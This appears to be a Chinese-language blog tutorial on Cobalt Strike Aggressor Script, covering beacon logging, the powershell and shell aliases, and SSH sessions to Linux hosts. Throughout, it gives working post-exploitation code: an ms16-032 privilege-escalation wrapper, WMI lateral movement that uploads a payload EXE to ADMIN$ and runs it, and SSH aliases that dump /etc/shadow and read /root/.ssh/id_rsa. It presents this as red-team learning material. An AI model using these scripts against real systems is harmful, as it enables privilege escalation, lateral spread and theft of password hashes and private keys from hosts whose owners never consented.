# Aggressor Script — The Logging Contract

## The Logging Contract

在 C2 3.0以上的版本对用户的输入记录有非常详细的记录，对每个信标执行的命令都会以记录对应得时间戳和用户名，Cobalt Strike客户端中的Beacon控制台处理这些日志记录，这些记录都是使用 binput 数据模型进行操作，他需要接收两个参数：

`$1` 信标的会话ID

`$2` 在beacon 中显示的信息

```shell
binput(beacon_ids()[0],"在beacon中显示的信息");
```

![](/images/Aggressor-Script/image-20201215211647740.png)

我们这里是直接输出的东西，我们也可以将这个东西改为命令：

```shell
binput(beacon_ids()[0],bshell(beacon_ids()[0],"whoami"));
```

![](/images/Aggressor-Script/image-20201215213105909.png)

## Conquering the Shell

> 官方文档这里是在讲解 beacon 中的 powershell命令是怎么来的，我不做翻译，但是吧官方为文档贴出来

```shell
# powershell 的编写源码

alias powershell {
    local('$args $cradle $runme $cmd');
    
    # $0 is the entire command with no parsing.
    $args   = substr($0, 11);
    
    # generate the download cradle (if one exists) for an imported PowerShell script
    $cradle = beacon_host_imported_script($1);
    
    # encode our download cradle AND cmdlet+args we want to run
    $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );
    
    # Build up our entire command line.
    $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";
    
    # task Beacon to run all of this.
    btask($1, "Tasked beacon to run: $args", "T1086");
    beacon_execute_job($1, "powershell", $cmd, 1);
}
```

下面是 shell 的源码：

```shell
alias shell {
    local('$args');
    $args = substr($0, 6);
    btask($1, "Tasked beacon to run: $args (OPSEC)", "T1059");
    bsetenv!($1, "_", $args);
    beacon_execute_job($1, "%COMSPEC%", " /C %_%", 0);
}
```

## Privilege Escalation (Run a Command)

> 权限提升的脚本源码

官方的 ms16-032 权限提升写法

```shell
# Integrate ms16-032
# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
sub ms16_032_elevator {
    local('$handle $script $oneliner');
    
    # acknowledge this command
    btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
    
    # read in the script
    $handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
    $script = readb($handle, -1);
    closef($handle);
    
    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);
    
    # run the specified command via this exploit.
    bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
}
```

## Privilege Escalation (Spawn a Session)

> 官方权限提升，产生新会话

源码：

```shell
beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
```

## Lateral Movement (Spawn a Session)

> 官方横向移动源码

```shell
beacon_remote_exploit_register("wmi", "x86", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x86"));
beacon_remote_exploit_register("wmi64", "x64", "Use WMI to run a Beacon payload", lambda(&wmi_remote_spawn, $arch => "x64"));
```

```shell
# $1 = bid, $2 = target, $3 = listener
sub wmi_remote_spawn {
    local('$name $exedata');

    btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3) . ") via WMI", "T1047");

    # we need a random file name.
    $name = rand(@("malware", "evil", "detectme")) . rand(100) . ".exe";

    # generate an EXE. $arch defined via &lambda when this function was registered with
    # beacon_remote_exploit_register
    $exedata = artifact_payload($3, "exe", $arch);

    # upload the EXE to our target (directly)
    bupload_raw!($1, "\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name", $exedata);

    # execute this via WMI
    brun!($1, "wmic /node:\" $+ $2 $+ \" process call create \"\\\\ $+ $2 $+ \\ADMIN\$\\ $+ $name $+ \"");

    # assume control of our payload (if it's an SMB or TCP Beacon)
    beacon_link($1, $2, $3);
}
```

上面涉及到的 数据模型 和 事件，在官方文档中都可以找到。

## SSH Sessions

> 和 beacon 一样也是信标，但是是从 Liunx 主机上返回的

如何上线一台 Liunx 主机呢?我们可以按照传统的方法使用官方给的方式，直接在 Beacon 中去链接内网中的liunx主机，语法如下：

```shell
beacon> ssh <IP>:<port><username><password>
```

我在本地开一台liunx主机，然后我们在横向上线：

![](/images/Aggressor-Script/image-20201215222850956.png)

可以发现我们得到一台liunx主机，这里上线 Liunx 主机的的作用大概是为了好看一点，能够很快速的定位liunx主机是由那个windows打通的，其他的就不给予评价，个人感觉可以直接ssh登录就行

当我们登录成功以后，我们就可以在 Liunx主机上执行命令，和 beacon 差不多：

![](/images/Aggressor-Script/image-20201215223153091.png)

除了官方的方式上线，我们可以使用 Cross C2，下载地址：<https://github.com/gloxec/CrossC2/releases/tag/v2.1>

官方文档：<https://gloxec.github.io/CrossC2/zh_cn/>

## 会话类型的判断

当我们上线主机后，可以使用 **-isssh** 数据模型检查是否为Liunx主机，它接受一个参数

`$1` 信标的会话ID，如果是的话就执行下面的代码或者函数

我们来判断一下我们的主机是否为 Liunx 还是 Win

```shell
command what {
    foreach @ID (beacon_ids()){
        if (-isssh @ID){
            println(@ID." 是liunx主机"." 机器名是：".beacon_info(@ID,"computer")." 用户名是：".beacon_info(@ID,"user"));
        }
        else{
            println(@ID." 是windo主机 "." 机器名是：".beacon_info(@ID,"computer")." 用户名是：".beacon_info(@ID,"user"));
        }
        }
}
```

运行一下：

![](/images/Aggressor-Script/image-20201215230423505.png)

判断出了我们的主机信息

## SSH Aliases

> 和 beacon alias 一样，我们也可以为 liunx 主机创建 SSH 控制台命令，比如查看我们的 /etc/password：

下面的 `$1` 是信标的会话 ID

```shell
ssh_alias hashdump {
    if (-isadmin $1) { # 判断是否为管理员，因为password非管理员不等查看
        binput($1,"导出passwod的HASH：")
        bshell($1, "cat /etc/shadow");
    }
    else {
        berror($1, "你不是管理员！！");
    }
}
```

![](/images/Aggressor-Script/image-20201215231244460.png)

当然你也可以写其他命令，bshell 数据模型是用来执行命令的，他需要的参数如下：

`$1` 信标的会话ID

`$2` 需要执行的命令

比如我们查看 liunx 主机的SSH密匙的信息：

```shell
ssh_alias ssh_demo{
    binput($1,"打印SSH私钥信息");
    bshell($1,"cat /root/.ssh/id_rsa");
}
```

运行：

![](/images/Aggressor-Script/image-20201215231926776.png)

## ssh\_command\_register

当自定义一个 ssh命令 以后，只有自己知道这个 命令的具体使用方式，当想要所有人都知道这条命令的含义的时候，我们可以使用 ssh\_command\_register 数据模型  显示帮助信息，他需要接受三个参数

`$1` 自定义的命令

`$2` 命令的介绍

`$3` 帮助信息，类似告诉他怎么用

举一个例子，现在我写一个命令用于从根目录查找我们想要的文件：

```shell
ssh_alias find {
    bshell($1,"find / -name $2");
}

ssh_command_register (
    "find",
    "查找你想要的文件从根目录开始",
    "使用方式: find test.txt"
);

```

![](/images/Aggressor-Script/image-20201216121638204.png)

在 ssh 控制台中输入 ? 号就可以查看到命令和他的解释，使用 `help find` 可以查看到这个命令的使用方式解析：

![](/images/Aggressor-Script/image-20201216121955524.png)

我们运行一下：

![](/images/Aggressor-Script/image-20201216122032723.png)

## Reacting to new SSH Sessions

和 beacon 一样，当有新的Liunx主机上线时，我们做的事情，使用 ssh\_initial 实事件触发，如下：

```shell
on ssh_initial {
    show_message("有新的LIUNX主机上线\nIP为".beacon_info($1,"internal")."\n主机名字为：".beacon_info($1,"computer"));

}
```

![](/images/Aggressor-Script/image-20201216123313505.png)
